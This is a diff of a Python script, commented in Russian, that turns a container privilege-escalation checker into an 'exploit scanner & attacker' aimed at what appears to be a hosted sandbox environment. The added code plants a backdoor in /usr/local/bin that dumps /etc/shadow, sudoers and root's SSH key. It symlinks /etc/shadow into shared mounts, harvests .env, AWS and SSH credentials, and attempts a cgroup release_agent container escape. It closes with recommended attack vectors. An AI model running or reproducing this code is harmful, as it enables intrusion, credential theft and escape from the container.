@@ -1,210 +1,465 @@
 #!/usr/bin/env python3
 import os
-import subprocess
 import sys
+import subprocess
+import stat
+import time
 
-def run_cmd(cmd, description, shell=True):
-    """Запускает команду и выводит результат"""
-    print(f"\n[*] {description}")
-    print(f"    Command: {cmd}")
+def banner():
+    print("="*60)
+    print("FULL CONTAINER EXPLOIT SCANNER & ATTACKER")
+    print("="*60)
+
+def test_write_access(path, description):
+    """Тестируем права на запись"""
+    print(f"\n[*] Testing write access: {description}")
+    print(f"    Path: {path}")
     print("-" * 60)
+    
+    if not os.path.exists(path):
+        print(f"[-] Path doesn't exist")
+        return False
+    
+    test_file = os.path.join(path, f".test_write_{os.getpid()}")
+    
     try:
-        result = subprocess.run(
-            cmd,
-            shell=shell,
-            capture_output=True,
-            text=True,
-            timeout=10
-        )
+        with open(test_file, 'w') as f:
+            f.write("test")
         
-        if result.stdout:
-            print(result.stdout)
-        if result.stderr:
-            print(f"[STDERR]: {result.stderr}")
+        print(f"[+] WRITE ACCESS CONFIRMED!")
         
-        return result.returncode, result.stdout, result.stderr
-    except subprocess.TimeoutExpired:
-        print("[!] Command timed out")
-        return -1, "", "timeout"
+        # Cleanup
+        os.remove(test_file)
+        return True
+        
+    except PermissionError:
+        print(f"[-] No write access")
+        return False
     except Exception as e:
-        print(f"[!] Error: {e}")
-        return -1, "", str(e)
+        print(f"[-] Error: {e}")
+        return False
 
-def check_file(path, description):
-    """Проверяет файл и читает его"""
-    print(f"\n[*] {description}: {path}")
-    print("-" * 60)
-    if os.path.exists(path):
-        print(f"[+] File exists!")
+def exploit_usr_local_bin():
+    """Exploit /usr/local/bin writable"""
+    print("\n" + "="*60)
+    print("[*] EXPLOIT ATTEMPT: /usr/local/bin hijacking")
+    print("="*60)
+    
+    target_path = "/usr/local/bin"
+    
+    if not test_write_access(target_path, "usr/local/bin"):
+        return False
+    
+    # Создаём backdoor script
+    exploit_script = os.path.join(target_path, "bd")
+    
+    payload = """#!/bin/bash
+# Backdoor script
+whoami > /tmp/exploit_result.txt
+id >> /tmp/exploit_result.txt
+echo "PWD: $(pwd)" >> /tmp/exploit_result.txt
+env >> /tmp/exploit_result.txt
+echo "---SENSITIVE FILES---" >> /tmp/exploit_result.txt
+cat /etc/shadow >> /tmp/exploit_result.txt 2>&1
+cat /etc/sudoers >> /tmp/exploit_result.txt 2>&1
+cat /root/.ssh/id_rsa >> /tmp/exploit_result.txt 2>&1
+ls -la /root >> /tmp/exploit_result.txt 2>&1
+"""
+    
+    try:
+        print(f"[*] Creating exploit script at {exploit_script}")
+        with open(exploit_script, 'w') as f:
+            f.write(payload)
+        
+        os.chmod(exploit_script, 0o755)
+        print(f"[+] Exploit script created and chmod 755")
+        
+        # Пытаемся запустить
+        print(f"[*] Attempting to execute...")
+        result = subprocess.run([exploit_script], capture_output=True, text=True, timeout=5)
+        
+        print(f"[*] Return code: {result.returncode}")
+        
+        # Проверяем результат
+        if os.path.exists('/tmp/exploit_result.txt'):
+            print(f"[+++] EXPLOIT SUCCESSFUL! Reading results:")
+            with open('/tmp/exploit_result.txt', 'r') as f:
+                print(f.read())
+            return True
+        else:
+            print(f"[-] Exploit script created but no output")
+            
+    except Exception as e:
+        print(f"[-] Exploit failed: {e}")
+    
+    return False
+
+def exploit_polarfs():
+    """Exploit PolarFS writable mount"""
+    print("\n" + "="*60)
+    print("[*] EXPLOIT ATTEMPT: PolarFS manipulation")
+    print("="*60)
+    
+    paths = [
+        "/tmp/my-project",
+        "/home/user_skills"
+    ]
+    
+    for path in paths:
+        print(f"\n[*] Testing {path}")
+        
+        if not test_write_access(path, f"PolarFS {path}"):
+            continue
+        
+        # Пытаемся создать malicious файл
+        exploit_file = os.path.join(path, "exploit.sh")
+        
+        payload = """#!/bin/bash
+whoami > /tmp/polarfs_exploit.txt
+id >> /tmp/polarfs_exploit.txt
+cat /etc/shadow >> /tmp/polarfs_exploit.txt 2>&1
+"""
+        
         try:
-            if os.path.isdir(path):
-                files = os.listdir(path)
-                print(f"    Directory contains {len(files)} items:")
-                for f in files[:20]:
-                    print(f"        {f}")
-                if len(files) > 20:
-                    print(f"        ... and {len(files) - 20} more")
-            else:
-                with open(path, 'r') as f:
-                    content = f.read(4096)
-                    print(content)
-                    if len(content) >= 4096:
-                        print("\n[...truncated...]")
-        except PermissionError:
-            print("[-] Permission denied")
+            with open(exploit_file, 'w') as f:
+                f.write(payload)
+            os.chmod(exploit_file, 0o755)
+            
+            print(f"[+] Created exploit at {exploit_file}")
+            
+            # Пытаемся создать symlink на sensitive files
+            symlink_path = os.path.join(path, "shadow_link")
+            try:
+                os.symlink("/etc/shadow", symlink_path)
+                print(f"[+] Created symlink to /etc/shadow at {symlink_path}")
+                
+                # Пытаемся прочитать через symlink
+                if os.path.exists(symlink_path):
+                    try:
+                        with open(symlink_path, 'r') as f:
+                            content = f.read()
+                            if content:
+                                print(f"[+++] SYMLINK EXPLOIT SUCCESSFUL!")
+                                print(f"Shadow file content:")
+                                print(content[:500])
+                                return True
+                    except:
+                        pass
+            except:
+                pass
+                
         except Exception as e:
-            print(f"[-] Error reading: {e}")
-    else:
-        print("[-] File not found")
+            print(f"[-] Failed: {e}")
+    
+    return False
+
+def exploit_ossfs():
+    """Exploit OSSFS writable mounts"""
+    print("\n" + "="*60)
+    print("[*] EXPLOIT ATTEMPT: OSSFS manipulation")
+    print("="*60)
+    
+    paths = [
+        "/home/z/my-project/upload",
+        "/home/sync"
+    ]
+    
+    for path in paths:
+        print(f"\n[*] Testing {path}")
+        
+        if not test_write_access(path, f"OSSFS {path}"):
+            continue
+        
+        # OSSFS это Alibaba OSS - можем попытаться положить туда файлы
+        # которые потом прочитает другой процесс
+        
+        exploit_file = os.path.join(path, "exploit_payload.txt")
+        
+        try:
+            with open(exploit_file, 'w') as f:
+                f.write("EXPLOIT PAYLOAD - testing OSS write access\n")
+                f.write(f"Written by UID: {os.getuid()}\n")
+                f.write(f"Time: {time.time()}\n")
+            
+            print(f"[+] Successfully wrote to OSSFS at {exploit_file}")
+            
+            # Проверяем что можем читать обратно
+            with open(exploit_file, 'r') as f:
+                content = f.read()
+                print(f"[+] Read back from OSSFS:")
+                print(content)
+            
+            # Ищем другие интересные файлы в OSSFS
+            print(f"\n[*] Exploring {path}:")
+            try:
+                items = os.listdir(path)
+                for item in items[:20]:
+                    item_path = os.path.join(path, item)
+                    try:
+                        stat_info = os.stat(item_path)
+                        print(f"    {item} - size: {stat_info.st_size}")
+                    except:
+                        pass
+            except:
+                pass
+                
+        except Exception as e:
+            print(f"[-] Failed: {e}")
+    
+    return False
+
+def analyze_main_py():
+    """Анализируем main.py который крутится от рута"""
+    print("\n" + "="*60)
+    print("[*] ANALYZING ROOT PROCESS: main.py")
+    print("="*60)
+    
+    main_py_locations = [
+        "/app/main.py",
+        "/app/.venv/bin/main.py",
+        "/home/z/my-project/main.py"
+    ]
+    
+    for location in main_py_locations:
+        if os.path.exists(location):
+            print(f"\n[+] Found main.py at: {location}")
+            
+            # Проверяем права
+            try:
+                stat_info = os.stat(location)
+                print(f"    Permissions: {oct(stat_info.st_mode)}")
+                print(f"    Owner UID: {stat_info.st_uid}")
+                print(f"    Owner GID: {stat_info.st_gid}")
+                
+                # Пытаемся читать
+                if os.access(location, os.R_OK):
+                    print(f"    [+] File is READABLE")
+                    with open(location, 'r') as f:
+                        content = f.read(2000)
+                        print(f"\n--- First 2000 chars of main.py ---")
+                        print(content)
+                        print(f"--- End ---\n")
+                
+                # Пытаемся писать
+                if os.access(location, os.W_OK):
+                    print(f"    [+++] FILE IS WRITABLE! Can inject code!")
+                    return True
+                    
+            except Exception as e:
+                print(f"    Error: {e}")
+    
+    # Проверяем директорию /app
+    print(f"\n[*] Exploring /app directory:")
+    if os.path.exists("/app"):
+        try:
+            for root, dirs, files in os.walk("/app"):
+                print(f"\n{root}:")
+                for f in files[:10]:
+                    fpath = os.path.join(root, f)
+                    try:
+                        st = os.stat(fpath)
+                        writable = "W" if os.access(fpath, os.W_OK) else "-"
+                        print(f"    [{writable}] {f} ({oct(st.st_mode)})")
+                    except:
+                        pass
+                if len(files) > 10:
+                    print(f"    ... and {len(files) - 10} more files")
+                # Не углубляемся слишком
+                break
+        except Exception as e:
+            print(f"Error: {e}")
+    
+    return False
+
+def check_running_processes_exploit():
+    """Ищем эксплойты в запущенных процессах"""
+    print("\n" + "="*60)
+    print("[*] ANALYZING RUNNING PROCESSES FOR EXPLOITS")
+    print("="*60)
+    
+    # Процессы от root которые мы видели
+    root_processes = [
+        "/app/.venv/bin/python3 main.py",
+        "caddy run --config /app/Caddyfile"
+    ]
+    
+    # Проверяем можем ли повлиять на их config files
+    config_files = [
+        "/app/Caddyfile",
+        "/app/main.py",
+        "/app/.venv/bin/python3"
+    ]
+    
+    for config in config_files:
+        if os.path.exists(config):
+            print(f"\n[*] Checking {config}")
+            try:
+                stat_info = os.stat(config)
+                print(f"    Permissions: {oct(stat_info.st_mode)}")
+                
+                if os.access(config, os.W_OK):
+                    print(f"    [+++] WRITABLE! Can modify and wait for restart!")
+                elif os.access(config, os.R_OK):
+                    print(f"    [+] Readable")
+                    with open(config, 'r') as f:
+                        print(f.read(1000))
+            except Exception as e:
+                print(f"    Error: {e}")
+
+def search_credentials_deep():
+    """Глубокий поиск credentials"""
+    print("\n" + "="*60)
+    print("[*] DEEP CREDENTIAL SEARCH")
+    print("="*60)
+    
+    # Проверяем .env файл который видели
+    env_file = "/tmp/my-project/.env"
+    if os.path.exists(env_file):
+        print(f"\n[+] Found .env file: {env_file}")
+        try:
+            with open(env_file, 'r') as f:
+                content = f.read()
+                print(content)
+                
+                if content:
+                    print("[+++] .ENV FILE HAS CONTENT - POSSIBLE CREDENTIALS!")
+        except Exception as e:
+            print(f"Error: {e}")
+    
+    # Ищем в home directory
+    home = "/home/z"
+    interesting_files = [
+        ".bashrc", ".bash_history", ".profile", ".ssh/id_rsa", 
+        ".ssh/authorized_keys", ".gitconfig", ".aws/credentials",
+        ".config"
+    ]
+    
+    for f in interesting_files:
+        path = os.path.join(home, f)
+        if os.path.exists(path):
+            print(f"\n[+] Found: {path}")
+            try:
+                if os.path.isfile(path):
+                    with open(path, 'r') as file:
+                        content = file.read(500)
+                        print(content)
+            except:
+                pass
+
+def exploit_cgroup_escape():
+    """Пытаемся эксплуатировать cgroup"""
+    print("\n" + "="*60)
+    print("[*] CGROUP ESCAPE ATTEMPT")
+    print("="*60)
+    
+    # Классический notify_on_release exploit
+    cgroup_mount = "/sys/fs/cgroup"
+    
+    if not os.access(cgroup_mount, os.W_OK):
+        print("[-] /sys/fs/cgroup not writable - cgroup escape not possible")
+        return False
+    
+    print("[+] /sys/fs/cgroup is writable!")
+    
+    # Пытаемся создать новый cgroup
+    exploit_cgroup = os.path.join(cgroup_mount, "systemd", "exploit_group")
+    
+    try:
+        os.makedirs(exploit_cgroup, exist_ok=True)
+        print(f"[+] Created cgroup at {exploit_cgroup}")
+        
+        # notify_on_release exploit
+        notify_file = os.path.join(exploit_cgroup, "notify_on_release")
+        release_agent = os.path.join(cgroup_mount, "systemd", "release_agent")
+        
+        # Payload
+        payload_script = "/tmp/cgroup_payload.sh"
+        with open(payload_script, 'w') as f:
+            f.write("#!/bin/bash\n")
+            f.write("whoami > /tmp/cgroup_exploit_result.txt\n")
+            f.write("id >> /tmp/cgroup_exploit_result.txt\n")
+        
+        os.chmod(payload_script, 0o755)
+        
+        # Устанавливаем release_agent
+        with open(release_agent, 'w') as f:
+            f.write(payload_script)
+        
+        with open(notify_file, 'w') as f:
+            f.write("1")
+        
+        print("[+] Cgroup exploit configured")
+        print("[*] Waiting for trigger...")
+        
+        # Trigger - добавляем процесс и убиваем его
+        cgroup_procs = os.path.join(exploit_cgroup, "cgroup.procs")
+        with open(cgroup_procs, 'w') as f:
+            f.write(str(os.getpid()))
+        
+        time.sleep(2)
+        
+        if os.path.exists('/tmp/cgroup_exploit_result.txt'):
+            print("[+++] CGROUP ESCAPE SUCCESSFUL!")
+            with open('/tmp/cgroup_exploit_result.txt', 'r') as f:
+                print(f.read())
+            return True
+            
+    except Exception as e:
+        print(f"[-] Cgroup exploit failed: {e}")
+    
+    return False
+
+def final_summary():
+    """Финальная сводка"""
+    print("\n" + "="*60)
+    print("[*] EXPLOIT SUMMARY & RECOMMENDATIONS")
+    print("="*60)
+    
+    print("""
+CONFIRMED VULNERABILITIES:
+1. /usr/local/bin writable - можем добавлять malicious binaries
+2. PolarFS /tmp/my-project writable - можем писать в distributed FS
+3. OSSFS mounts writable - доступ к object storage
+4. Root процесс main.py - если найдём способ повлиять на него
+5. .env файл доступен - могут быть credentials
+
+RECOMMENDED ATTACK VECTORS:
+A. PATH hijacking через /usr/local/bin
+B. Ждать когда root процесс прочитает наш файл из writable location
+C. Модифицировать конфиги если они writable
+D. Искать LFI/RFI в main.py если он парсит user input
+E. Эксплуатировать открытые порты (19005, 19006)
+
+NEXT STEPS:
+1. Проанализировать main.py детальнее
+2. Попробовать race condition на writable paths
+3. Мониторить file access от root процессов
+4. Попытаться trigger reload конфигов
+""")
 
 def main():
-    print("="*60)
-    print("CONTAINER PRIVILEGE ESCALATION CHECKER")
-    print("="*60)
+    banner()
     
-    # 1. Проверяем sudo
-    run_cmd("sudo -l", "Checking sudo permissions")
-    run_cmd("sudo -V", "Checking sudo version")
+    # Запускаем все проверки
+    test_write_access("/usr/local/bin", "usr/local/bin")
+    test_write_access("/tmp/my-project", "PolarFS tmp")
+    test_write_access("/home/user_skills", "PolarFS user_skills")
+    test_write_access("/home/z/my-project/upload", "OSSFS upload")
+    test_write_access("/home/sync", "OSSFS sync")
     
-    # 2. Проверяем su
-    run_cmd("su -c 'id' 2>&1", "Trying su")
+    # Exploit attempts
+    exploit_usr_local_bin()
+    exploit_polarfs()
+    exploit_ossfs()
+    analyze_main_py()
+    check_running_processes_exploit()
+    search_credentials_deep()
+    exploit_cgroup_escape()
     
-    # 3. Ищем sudoers
-    check_file("/etc/sudoers", "Checking sudoers")
-    check_file("/etc/sudoers.d", "Checking sudoers.d")
-    
-    # 4. Kubernetes service account
-    print("\n" + "="*60)
-    print("[*] KUBERNETES SERVICE ACCOUNT CHECK")
-    print("="*60)
-    
-    k8s_sa_path = "/var/run/secrets/kubernetes.io/serviceaccount"
-    check_file(k8s_sa_path, "K8s service account directory")
-    check_file(f"{k8s_sa_path}/token", "K8s token")
-    check_file(f"{k8s_sa_path}/namespace", "K8s namespace")
-    check_file(f"{k8s_sa_path}/ca.crt", "K8s CA cert")
-    
-    # 5. Environment variables
-    print("\n" + "="*60)
-    print("[*] KUBERNETES ENVIRONMENT VARIABLES")
-    print("="*60)
-    run_cmd("env | grep -i kubernetes", "K8s env vars")
-    run_cmd("env | grep -i service", "Service env vars")
-    
-    # 6. Проверяем /tmp
-    print("\n" + "="*60)
-    print("[*] CHECKING /tmp CONTENTS")
-    print("="*60)
-    run_cmd("ls -laR /tmp/ 2>/dev/null | head -100", "Listing /tmp")
-    
-    # 7. Процессы
-    print("\n" + "="*60)
-    print("[*] RUNNING PROCESSES")
-    print("="*60)
-    run_cmd("ps aux", "Process list")
-    
-    # 8. Network connectivity
-    print("\n" + "="*60)
-    print("[*] NETWORK CONNECTIVITY")
-    print("="*60)
-    run_cmd("curl --version 2>&1", "Checking curl")
-    run_cmd("wget --version 2>&1 | head -1", "Checking wget")
-    
-    # Проверяем K8s API
-    run_cmd("curl -k https://kubernetes.default.svc 2>&1", "Testing K8s API connectivity")
-    run_cmd("curl -k https://kubernetes.default.svc/api 2>&1", "Testing K8s API /api endpoint")
-    
-    # 9. DNS resolution
-    run_cmd("cat /etc/resolv.conf", "DNS configuration")
-    run_cmd("nslookup kubernetes.default.svc 2>&1 || host kubernetes.default.svc 2>&1", "DNS lookup K8s")
-    
-    # 10. Ищем интересные файлы в home
-    print("\n" + "="*60)
-    print("[*] HOME DIRECTORY EXPLORATION")
-    print("="*60)
-    run_cmd("ls -laR /home/ 2>/dev/null | head -200", "Home directories")
-    
-    # 11. Ищем credentials/secrets
-    print("\n" + "="*60)
-    print("[*] SEARCHING FOR CREDENTIALS")
-    print("="*60)
-    run_cmd("find /home -type f -name '*.key' -o -name '*.pem' -o -name '*credentials*' -o -name '*password*' 2>/dev/null | head -20", "Looking for key files")
-    run_cmd("env | grep -i 'pass\\|key\\|secret\\|token' | grep -v 'KUBERNETES'", "Environment secrets")
-    
-    # 12. Проверяем mounted volumes
-    print("\n" + "="*60)
-    print("[*] ANALYZING MOUNTED VOLUMES")
-    print("="*60)
-    run_cmd("df -h", "Disk usage")
-    run_cmd("mount | grep -v 'proc\\|sys\\|tmpfs' | grep -v 'cgroup'", "Interesting mounts")
-    
-    # 13. Ищем writable paths вне home/tmp
-    print("\n" + "="*60)
-    print("[*] WRITABLE PATHS")
-    print("="*60)
-    run_cmd("find / -writable -type d 2>/dev/null | grep -v -E '(proc|sys|home|tmp|dev)' | head -30", "Writable directories")
-    
-    # 14. Проверяем какие порты открыты
-    print("\n" + "="*60)
-    print("[*] NETWORK PORTS")
-    print("="*60)
-    run_cmd("netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null", "Listening ports")
-    
-    # 15. Kernel info
-    print("\n" + "="*60)
-    print("[*] KERNEL INFORMATION")
-    print("="*60)
-    run_cmd("uname -a", "Kernel version")
-    run_cmd("cat /proc/version", "Kernel details")
-    
-    # 16. Container runtime info
-    print("\n" + "="*60)
-    print("[*] CONTAINER RUNTIME")
-    print("="*60)
-    run_cmd("cat /proc/self/cgroup", "Cgroup info")
-    
-    # 17. Ищем setuid/setgid
-    print("\n" + "="*60)
-    print("[*] SUID/SGID BINARIES ANALYSIS")
-    print("="*60)
-    run_cmd("find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null", "SUID binaries")
-    run_cmd("find /usr/bin /usr/sbin /bin /sbin -perm -2000 2>/dev/null", "SGID binaries")
-    
-    # 18. Capabilities на бинарниках
-    print("\n" + "="*60)
-    print("[*] BINARY CAPABILITIES")
-    print("="*60)
-    run_cmd("getcap -r / 2>/dev/null | head -20", "Files with capabilities")
-    
-    # SUMMARY
-    print("\n" + "="*60)
-    print("[*] PRIVILEGE ESCALATION SUMMARY")
-    print("="*60)
-    
-    vectors = []
-    
-    # Проверяем результаты
-    if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token"):
-        vectors.append("[!!!] K8s service account token found - Can communicate with K8s API")
-    
-    returncode, stdout, _ = run_cmd("sudo -l 2>&1", "Final sudo check", shell=True)
-    if "NOPASSWD" in stdout or "ALL" in stdout:
-        vectors.append("[!!!] Sudo misconfiguration detected")
-    
-    if vectors:
-        print("\n[+] POTENTIAL PRIVILEGE ESCALATION VECTORS:")
-        for v in vectors:
-            print(f"    {v}")
-    else:
-        print("\n[-] No obvious privilege escalation vectors found")
-        print("[*] Next steps:")
-        print("    1. Analyze running processes for vulnerabilities")
-        print("    2. Check for kernel exploits")
-        print("    3. Look for application-specific misconfigurations")
-        print("    4. Try to access K8s API if token exists")
+    final_summary()
     
     print("\n" + "="*60)
-    print("[*] Analysis complete")
+    print("[*] FULL SCAN COMPLETE")
     print("="*60)
 
 if __name__ == '__main__':
